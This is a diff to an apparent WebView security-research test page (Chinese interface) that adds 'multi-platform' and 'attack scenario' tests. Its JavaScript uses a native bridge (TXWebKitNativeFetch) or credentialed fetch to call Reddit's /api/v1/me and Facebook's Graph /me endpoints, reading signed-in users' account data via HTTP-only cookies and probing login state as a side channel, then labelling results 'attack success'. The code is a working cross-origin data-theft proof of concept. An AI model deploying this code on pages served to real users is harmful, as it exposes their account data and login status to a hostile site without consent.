@@ -175,6 +175,21 @@
           <strong>⚠️ 重要提示：</strong>如果测试显示"已登录"但你确定没有登录，可能是WebView中保留了之前的Cookie。点击"清除Cookie"按钮清除后重新测试。
         </small>
       </div>
+      <!-- 多平台验证和攻击场景测试 -->
+      <div style="background:#fff1f0;border:2px solid #ff4d4f;border-radius:6px;padding:12px;margin:12px 0">
+        <strong style="color:#cf1322">🔴 HTTP-only Cookie持久化验证和攻击场景测试</strong>
+        <p style="margin:8px 0;font-size:13px;color:#cf1322">
+          <strong>研究目标：</strong>验证HTTP-only Cookie在不同App WebView中的持久化问题，并测试攻击场景
+        </p>
+        <div class="row" style="margin:8px 0">
+          <button id="testMultiPlatform" style="background:#ff4d4f;color:white">🌐 多平台验证测试</button>
+          <button id="testAttackScenarios" style="background:#ff7875;color:white">🎯 攻击场景测试</button>
+        </div>
+        <small style="color:#cf1322;display:block;margin-top:8px;font-size:11px">
+          <strong>说明：</strong>在不同App（QQ、微信、支付宝等）的WebView中打开此页面，测试HTTP-only Cookie的持久化问题。攻击场景测试会演示可能的利用方式。
+        </small>
+        <div id="multiPlatformResults" style="display:none;margin-top:12px;padding:8px;background:#fff;border:1px solid #ddd;border-radius:4px;max-height:400px;overflow-y:auto;font-size:12px"></div>
+      </div>
       <div style="background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:8px;margin:8px 0;font-size:12px">
         <strong>⚠️ 提示：</strong>某些网站（如B站）可能有严格的安全策略，即使使用Bridge也无法访问。这是正常现象，说明该网站有良好的安全防护。如果所有请求都失败，建议：
         <ul style="margin:4px 0;padding-left:20px">
@@ -2553,11 +2568,348 @@ https://httpbin.org/anything</textarea>
     }, 2000);
   }
   
+  // 多平台验证测试
+  async function testMultiPlatform() {
+    const resultsDiv = document.getElementById('multiPlatformResults');
+    if (resultsDiv) {
+      resultsDiv.style.display = 'block';
+      resultsDiv.innerHTML = '⏳ 正在检测当前平台和WebView信息...';
+    }
+    
+    const platformInfo = {
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      cookieEnabled: navigator.cookieEnabled,
+      // 检测是哪个App的WebView
+      app: detectApp(),
+      // 检测Cookie状态
+      cookies: detectCookies({ url: 'https://oauth.reddit.com/api/v1/me' }),
+      // 测试Reddit API
+      redditTest: null,
+      // 测试Facebook API
+      facebookTest: null
+    };
+    
+    // 检测App类型
+    function detectApp() {
+      const ua = navigator.userAgent;
+      if (ua.includes('QQ/')) return 'QQ';
+      if (ua.includes('MicroMessenger')) return '微信';
+      if (ua.includes('AlipayClient')) return '支付宝';
+      if (ua.includes('Weibo')) return '微博';
+      if (ua.includes('TikTok')) return 'TikTok/抖音';
+      if (ua.includes('ByteDance')) return '字节跳动';
+      return '未知';
+    }
+    
+    // 测试Reddit API
+    try {
+      const testUrl = 'https://oauth.reddit.com/api/v1/me';
+      let response = null;
+      
+      if (typeof window.TXWebKitNativeFetch === 'function') {
+        response = await Promise.race([
+          Promise.resolve(window.TXWebKitNativeFetch(testUrl)),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+        ]);
+      } else {
+        response = await Promise.race([
+          fetch(testUrl, { mode: 'cors', credentials: 'include', cache: 'no-store' }),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+        ]);
+      }
+      
+      if (response) {
+        const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+        let bodyText = '';
+        try {
+          if (typeof response.text === 'function') {
+            bodyText = await response.text();
+          } else if (typeof response.body === 'string') {
+            bodyText = response.body;
+          }
+        } catch(e) {}
+        
+        platformInfo.redditTest = {
+          status: status,
+          hasUserData: bodyText.includes('"features"') || bodyText.includes('"name"'),
+          bodySnippet: bodyText.slice(0, 200),
+          loggedIn: status === 200 && (bodyText.includes('"features"') || bodyText.includes('"name"'))
+        };
+      }
+    } catch(e) {
+      platformInfo.redditTest = { error: String(e.message || e) };
+    }
+    
+    // 测试Facebook API
+    try {
+      const testUrl = 'https://graph.facebook.com/me?fields=id,name';
+      let response = null;
+      
+      if (typeof window.TXWebKitNativeFetch === 'function') {
+        response = await Promise.race([
+          Promise.resolve(window.TXWebKitNativeFetch(testUrl)),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+        ]);
+      } else {
+        response = await Promise.race([
+          fetch(testUrl, { mode: 'cors', credentials: 'include', cache: 'no-store' }),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+        ]);
+      }
+      
+      if (response) {
+        const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+        let bodyText = '';
+        try {
+          if (typeof response.text === 'function') {
+            bodyText = await response.text();
+          } else if (typeof response.body === 'string') {
+            bodyText = response.body;
+          }
+        } catch(e) {}
+        
+        platformInfo.facebookTest = {
+          status: status,
+          hasUserData: bodyText.includes('"id"') || bodyText.includes('"name"'),
+          bodySnippet: bodyText.slice(0, 200),
+          loggedIn: status === 200 && (bodyText.includes('"id"') || bodyText.includes('"name"'))
+        };
+      }
+    } catch(e) {
+      platformInfo.facebookTest = { error: String(e.message || e) };
+    }
+    
+    // 显示结果
+    if (resultsDiv) {
+      let html = '<strong>📊 多平台验证结果</strong><br><br>';
+      html += `<strong>当前平台：</strong>${platformInfo.app}<br>`;
+      html += `<strong>User Agent：</strong>${platformInfo.userAgent}<br><br>`;
+      
+      html += `<strong>Cookie状态：</strong><br>`;
+      html += `- 可见Cookie数量: ${platformInfo.cookies.count}<br>`;
+      if (platformInfo.cookies.count === 0) {
+        html += `⚠️ <strong>关键发现：没有可见Cookie！</strong><br><br>`;
+      }
+      
+      html += `<strong>Reddit API测试：</strong><br>`;
+      if (platformInfo.redditTest && platformInfo.redditTest.loggedIn) {
+        html += `🔓 <strong>已登录</strong>（状态码: ${platformInfo.redditTest.status}）<br>`;
+        html += `⚠️ <strong>安全发现：没有可见Cookie但返回了用户数据！</strong><br>`;
+        html += `响应体: ${platformInfo.redditTest.bodySnippet}<br>`;
+      } else if (platformInfo.redditTest && platformInfo.redditTest.error) {
+        html += `❌ 测试失败: ${platformInfo.redditTest.error}<br>`;
+      } else {
+        html += `🔒 未登录（状态码: ${platformInfo.redditTest?.status || 'unknown'}）<br>`;
+      }
+      html += '<br>';
+      
+      html += `<strong>Facebook API测试：</strong><br>`;
+      if (platformInfo.facebookTest && platformInfo.facebookTest.loggedIn) {
+        html += `🔓 <strong>已登录</strong>（状态码: ${platformInfo.facebookTest.status}）<br>`;
+        html += `⚠️ <strong>安全发现：没有可见Cookie但返回了用户数据！</strong><br>`;
+        html += `响应体: ${platformInfo.facebookTest.bodySnippet}<br>`;
+      } else if (platformInfo.facebookTest && platformInfo.facebookTest.error) {
+        html += `❌ 测试失败: ${platformInfo.facebookTest.error}<br>`;
+      } else {
+        html += `🔒 未登录（状态码: ${platformInfo.facebookTest?.status || 'unknown'}）<br>`;
+      }
+      
+      html += '<br><strong>💡 建议：</strong><br>';
+      html += '在不同App（微信、支付宝、微博等）的WebView中打开此页面，对比测试结果。<br>';
+      html += '如果多个平台都显示相同的问题，说明这是WebView的通用问题。';
+      
+      resultsDiv.innerHTML = html;
+      
+      // 保存到results
+      results.runs.push({ type: 'multi-platform-test', report: platformInfo, timestamp: new Date().toISOString() });
+      pushRaw({ type: 'multi-platform-test', platformInfo });
+    }
+  }
+  
+  // 攻击场景测试
+  async function testAttackScenarios() {
+    const resultsDiv = document.getElementById('multiPlatformResults');
+    if (resultsDiv) {
+      resultsDiv.style.display = 'block';
+      resultsDiv.innerHTML = '⏳ 正在测试攻击场景...';
+    }
+    
+    const attackScenarios = {
+      timestamp: new Date().toISOString(),
+      scenarios: []
+    };
+    
+    // 场景1：利用Bridge读取用户数据（即使没有可见Cookie）
+    const scenario1 = {
+      name: '场景1：利用Bridge读取用户数据（HTTP-only Cookie泄露）',
+      description: '即使没有可见Cookie，恶意网页可以通过Bridge读取用户数据',
+      testUrl: 'https://oauth.reddit.com/api/v1/me',
+      result: null
+    };
+    
+    try {
+      if (typeof window.TXWebKitNativeFetch === 'function') {
+        const response = await Promise.race([
+          Promise.resolve(window.TXWebKitNativeFetch(scenario1.testUrl)),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+        ]);
+        
+        if (response) {
+          const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+          let bodyText = '';
+          try {
+            if (typeof response.text === 'function') {
+              bodyText = await response.text();
+            } else if (typeof response.body === 'string') {
+              bodyText = response.body;
+            }
+          } catch(e) {}
+          
+          scenario1.result = {
+            success: true,
+            status: status,
+            hasUserData: bodyText.includes('"features"') || bodyText.includes('"name"'),
+            userDataSnippet: bodyText.slice(0, 300),
+            risk: '高风险：恶意网页可以读取用户数据，即使没有可见Cookie'
+          };
+        }
+      } else {
+        scenario1.result = { success: false, error: 'Bridge不可用' };
+      }
+    } catch(e) {
+      scenario1.result = { success: false, error: String(e.message || e) };
+    }
+    
+    attackScenarios.scenarios.push(scenario1);
+    
+    // 场景2：检测登录状态（侧信道攻击）
+    const scenario2 = {
+      name: '场景2：检测用户登录状态（侧信道攻击）',
+      description: '通过API响应状态码和响应体判断用户是否登录',
+      testUrls: [
+        'https://oauth.reddit.com/api/v1/me',
+        'https://graph.facebook.com/me?fields=id,name'
+      ],
+      results: []
+    };
+    
+    for (const url of scenario2.testUrls) {
+      try {
+        if (typeof window.TXWebKitNativeFetch === 'function') {
+          const response = await Promise.race([
+            Promise.resolve(window.TXWebKitNativeFetch(url)),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+          ]);
+          
+          if (response) {
+            const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+            let bodyText = '';
+            try {
+              if (typeof response.text === 'function') {
+                bodyText = await response.text();
+              } else if (typeof response.body === 'string') {
+                bodyText = response.body;
+              }
+            } catch(e) {}
+            
+            scenario2.results.push({
+              url: url,
+              status: status,
+              loggedIn: status === 200 && (bodyText.includes('"features"') || bodyText.includes('"id"')),
+              risk: '中风险：可以判断用户登录状态，用于精准广告或社交工程攻击'
+            });
+          }
+        }
+      } catch(e) {
+        scenario2.results.push({ url: url, error: String(e.message || e) });
+      }
+    }
+    
+    attackScenarios.scenarios.push(scenario2);
+    
+    // 场景3：跨会话Cookie持久化
+    const scenario3 = {
+      name: '场景3：跨会话Cookie持久化验证',
+      description: '验证HTTP-only Cookie是否跨会话持久化',
+      cookieCount: document.cookie ? document.cookie.split(';').length : 0,
+      note: '如果Cookie数量为0但API返回用户数据，说明存在HTTP-only Cookie持久化问题',
+      risk: '高风险：即使用户认为已退出登录，认证状态可能仍然有效'
+    };
+    
+    attackScenarios.scenarios.push(scenario3);
+    
+    // 显示结果
+    if (resultsDiv) {
+      let html = '<strong>🎯 攻击场景测试结果</strong><br><br>';
+      
+      attackScenarios.scenarios.forEach((scenario, index) => {
+        html += `<strong>${scenario.name}</strong><br>`;
+        html += `${scenario.description}<br>`;
+        
+        if (scenario.result) {
+          if (scenario.result.success) {
+            html += `✅ 攻击成功<br>`;
+            html += `状态码: ${scenario.result.status}<br>`;
+            html += `包含用户数据: ${scenario.result.hasUserData ? '是' : '否'}<br>`;
+            if (scenario.result.userDataSnippet) {
+              html += `用户数据片段: ${scenario.result.userDataSnippet}<br>`;
+            }
+            html += `⚠️ <strong>风险等级: ${scenario.result.risk}</strong><br>`;
+          } else {
+            html += `❌ 攻击失败: ${scenario.result.error}<br>`;
+          }
+        }
+        
+        if (scenario.results) {
+          scenario.results.forEach(r => {
+            html += `URL: ${r.url}<br>`;
+            html += `状态码: ${r.status || 'unknown'}<br>`;
+            html += `登录状态: ${r.loggedIn ? '🔓 已登录' : '🔒 未登录'}<br>`;
+            if (r.risk) html += `⚠️ <strong>风险: ${r.risk}</strong><br>`;
+            if (r.error) html += `❌ 错误: ${r.error}<br>`;
+            html += '<br>';
+          });
+        }
+        
+        if (scenario.note) {
+          html += `📝 ${scenario.note}<br>`;
+          html += `⚠️ <strong>风险: ${scenario.risk}</strong><br>`;
+        }
+        
+        html += '<br>';
+      });
+      
+      html += '<strong>🔴 攻击利用方式总结：</strong><br>';
+      html += '1. <strong>数据泄露：</strong>恶意网页可以通过Bridge读取用户数据（即使没有可见Cookie）<br>';
+      html += '2. <strong>状态检测：</strong>通过API响应判断用户登录状态，用于精准广告或社交工程攻击<br>';
+      html += '3. <strong>持久化问题：</strong>HTTP-only Cookie跨会话持久化，即使用户认为已退出登录，认证状态可能仍然有效<br>';
+      html += '4. <strong>隐私泄露：</strong>恶意网页可以获取用户的登录状态、用户特征、实验分组等信息<br>';
+      
+      resultsDiv.innerHTML = html;
+      
+      // 保存到results
+      results.runs.push({ type: 'attack-scenarios', report: attackScenarios, timestamp: new Date().toISOString() });
+      pushRaw({ type: 'attack-scenarios', attackScenarios });
+    }
+  }
+  
   // 立即尝试绑定，如果DOM还没加载完成则等待
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', bindQuickTestEvents);
   } else {
     bindQuickTestEvents();
+  }
+  
+  // 绑定多平台测试按钮
+  const testMultiPlatformBtn = document.getElementById('testMultiPlatform');
+  const testAttackScenariosBtn = document.getElementById('testAttackScenarios');
+  if (testMultiPlatformBtn) {
+    testMultiPlatformBtn.onclick = testMultiPlatform;
+  }
+  if (testAttackScenariosBtn) {
+    testAttackScenariosBtn.onclick = testAttackScenarios;
   }
   
   // Facebook Bridge 系统性测试功能
